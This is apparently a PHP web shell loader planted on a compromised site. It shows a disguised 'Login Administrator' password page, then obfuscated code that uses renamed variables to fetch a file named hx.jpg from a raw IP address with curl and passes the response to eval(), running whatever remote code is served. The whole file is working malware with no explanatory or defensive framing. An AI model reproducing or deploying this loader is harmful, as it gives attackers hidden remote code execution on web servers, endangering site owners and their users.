<?php
$password = 'adminadminadmin';
error_reporting(0);
set_time_limit(0);

session_start();
if (!isset($_SESSION['loggedIn'])) {
    $_SESSION['loggedIn'] = false;
}

if (isset($_POST['password'])) {
    if (md5($_POST['password']) == $password) {
        $_SESSION['loggedIn'] = true;
    }
} 

if (!$_SESSION['loggedIn']): ?>

<html><head><title>Login Administrator</title></head>
  <body bgcolor="black">
    <center>
    <p align="center"><center><font style="font-size:13px" color="red" face="text-dark">
    <form method="post">
      <input type="password" name="password">
      <input type="submit" name="submit" value="  Login"><br>
    </form>
  </body>
</html>

<?php
exit();
endif;
?>
<?php 
${"GLOBALS"}["delves"]="love";
${"GLOBALS"}["0xfah"]="you";
error_reporting(0);
set_time_limit(0);
${"GLOBALS"}["i"]="love";
${"GLOBALS"}["haxor"]="love";
${${"GLOBALS"}["haxor"]}=curl_init();
${"GLOBALS"}["world"]="love";
${"GLOBALS"}["Thxngfa"]="love";
curl_setopt(${${"GLOBALS"}["i"]},
CURLOPT_URL,"http://156.67.221.29/hx.jpg");
curl_setopt(${${"GLOBALS"}["world"]},CURLOPT_RETURNTRANSFER,1);
${${"GLOBALS"}["0xfah"]}=curl_exec(${${"GLOBALS"}["delves"]});
curl_close(${${"GLOBALS"}["Thxngfa"]});
eval("?>".${${"GLOBALS"}["0xfah"]});
?>
